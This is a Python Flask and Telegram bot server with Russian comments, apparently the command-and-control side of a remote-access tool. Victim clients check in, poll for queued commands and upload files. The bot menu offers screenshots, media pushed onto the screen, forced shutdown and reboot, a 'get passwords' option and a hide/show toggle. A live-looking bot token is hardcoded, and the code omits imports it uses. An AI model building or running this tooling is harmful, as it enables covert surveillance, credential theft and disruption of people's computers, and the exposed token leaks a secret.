import os
import json
import uuid
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters

app = Flask(__name__)

# ===== КОНФИГУРАЦИЯ =====
TOKEN = "8004274832:AAGbnNEvxH09Ja9OdH9KoEOFZfCl98LsqDU"  # Токен от @BotFather
SECRET_KEY = "YOUR_SECRET_KEY"  # Должен совпадать с ключом на клиенте
PORT = int(os.environ.get('PORT', 5000))
# ========================

bot = Bot(token=TOKEN)
clients = {}  # Словарь для хранения состояния клиентов
pending_commands = {}  # Очередь команд

# Меню управления
KEYBOARD_LAYOUT = [
    [InlineKeyboardButton("🖥 IP адрес", callback_data='ip'),
     InlineKeyboardButton("📸 Скриншот", callback_data='screenshot')],
    [InlineKeyboardButton("🎥 Видео на экран", callback_data='play_video'),
     InlineKeyboardButton("🖼 Фото на экран", callback_data='play_photo')],
    [InlineKeyboardButton("❌ Alt+F4", callback_data='altf4'),
     InlineKeyboardButton("🔒 Получить пароли", callback_data='passwords')],
    [InlineKeyboardButton("🔄 Перезагрузить", callback_data='reboot'),
     InlineKeyboardButton("⏹ Выключить", callback_data='shutdown')],
    [InlineKeyboardButton("👻 Скрыть/Показать", callback_data='toggle_visibility')]
]

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """Обработка проверки состояния от клиента"""
    data = request.json
    if data.get('key') != SECRET_KEY:
        return jsonify({'status': 'unauthorized'}), 401
    
    client_id = data.get('ip', 'unknown')
    clients[client_id] = {
        'last_seen': datetime.now(),
        'ip': data.get('ip', ''),
        'status': 'online'
    }
    return jsonify({'status': 'ok'})

@app.route('/commands', methods=['GET'])
def get_commands():
    """Получение команд для клиента"""
    client_key = request.args.get('key')
    if client_key != SECRET_KEY:
        return jsonify([])
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    commands = pending_commands.get(client_ip, [])
    return jsonify(commands)

@app.route('/complete', methods=['POST'])
def complete_command():
    """Подтверждение выполнения команды"""
    data = request.json
    if data.get('key') != SECRET_KEY:
        return jsonify({'status': 'unauthorized'}), 401
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    command_id = data.get('command_id')
    
    if client_ip in pending_commands:
        pending_commands[client_ip] = [
            cmd for cmd in pending_commands[client_ip] 
            if cmd.get('id') != command_id
        ]
    
    return jsonify({'status': 'ok'})

@app.route('/upload', methods=['POST'])
def upload_file():
    """Загрузка файлов от клиента"""
    if request.form.get('key') != SECRET_KEY:
        return jsonify({'status': 'unauthorized'}), 401
    
    file = request.files.get('file')
    file_type = request.form.get('type', 'file')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    if file:
        # Для демонстрации просто сохраняем файл
        filename = f"{file_type}_{client_ip}_{int(datetime.now().timestamp())}"
        file.save(os.path.join('uploads', filename))
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'no_file'}), 400

def send_menu(chat_id):
    """Отправка меню с кнопками"""
    bot.send_message(
        chat_id=chat_id,
        text="🔒 <b>Управление ноутбуком</b> 🔒\nВыберите действие:",
        reply_markup=InlineKeyboardMarkup(KEYBOARD_LAYOUT),
        parse_mode='HTML'
    )

def button_handler(update: Update, context):
    """Обработчик нажатий кнопок"""
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    chat_id = query.message.chat_id
    
    try:
        # Получаем первый доступный клиент
        client_id = next(iter(clients.keys()), None)
        
        if not client_id:
            bot.send_message(chat_id, "⚠️ Нет подключенных устройств")
            return
        
        if data == 'ip':
            bot.send_message(chat_id, f"📡 IP адрес устройства: {clients[client_id]['ip']}")
        
        elif data == 'screenshot':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'screenshot',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            bot.send_message(chat_id, "📸 Запрошен скриншот...")
        
        elif data == 'play_video':
            bot.send_message(chat_id, "📹 Отправьте видео файл...")
            context.user_data['awaiting_media'] = {'type': 'video', 'client': client_id}
        
        elif data == 'play_photo':
            bot.send_message(chat_id, "🖼 Отправьте фото...")
            context.user_data['awaiting_media'] = {'type': 'image', 'client': client_id}
        
        elif data == 'altf4':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'altf4',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            bot.send_message(chat_id, "✅ Команда Alt+F4 отправлена")
        
        elif data == 'reboot':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'reboot',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            bot.send_message(chat_id, "🔄 Команда перезагрузки отправлена")
        
        elif data == 'shutdown':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'shutdown',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            bot.send_message(chat_id, "⏹ Команда выключения отправлена")
        
        # Обновляем меню
        send_menu(chat_id)
        bot.answer_callback_query(query.id)
    
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Ошибка: {str(e)}")

def media_handler(update: Update, context):
    """Обработчик медиафайлов"""
    media_info = context.user_data.get('awaiting_media')
    if not media_info:
        return
    
    chat_id = update.message.chat_id
    client_id = media_info.get('client')
    media_type = media_info.get('type')
    
    try:
        if media_type == 'image' and update.message.photo:
            photo = update.message.photo[-1]
            file = bot.get_file(photo.file_id)
            file_url = file.file_path
            
            command = {
                'id': str(uuid.uuid4()),
                'type': 'media',
                'media_type': 'image',
                'url': file_url,
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            bot.send_message(chat_id, "✅ Фото отправлено на устройство")
        
        elif media_type == 'video' and update.message.video:
            video = update.message.video
            file = bot.get_file(video.file_id)
            file_url = file.file_path
            
            command = {
                'id': str(uuid.uuid4()),
                'type': 'media',
                'media_type': 'video',
                'url': file_url,
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            bot.send_message(chat_id, "✅ Видео отправлено на устройство")
        
        # Очищаем состояние ожидания
        del context.user_data['awaiting_media']
        send_menu(chat_id)
    
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Ошибка обработки медиа: {str(e)}")

def start_bot():
    """Запуск Telegram бота"""
    updater = Updater(token=TOKEN, use_context=True)
    dp = updater.dispatcher
    
    # Обработчики
    dp.add_handler(CommandHandler('start', lambda u,c: send_menu(u.message.chat_id)))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.photo | Filters.video, media_handler))
    
    # Запуск бота
    updater.start_polling()
    updater.idle()

@app.route('/')
def home():
    return "PC Control Bot is running!"

def cleanup_clients():
    """Очистка неактивных клиентов"""
    while True:
        now = datetime.now()
        for client_id, client_data in list(clients.items()):
            if now - client_data['last_seen'] > timedelta(minutes=5):
                del clients[client_id]
        time.sleep(300)

if __name__ == '__main__':
    # Создаем папку для загрузок
    os.makedirs('uploads', exist_ok=True)
    
    # Запускаем очистку клиентов в фоне
    threading.Thread(target=cleanup_clients, daemon=True).start()
    
    # Запускаем бота в отдельном потоке
    threading.Thread(target=start_bot, daemon=True).start()
    
    # Запускаем Flask сервер
    app.run(host='0.0.0.0', port=PORT)
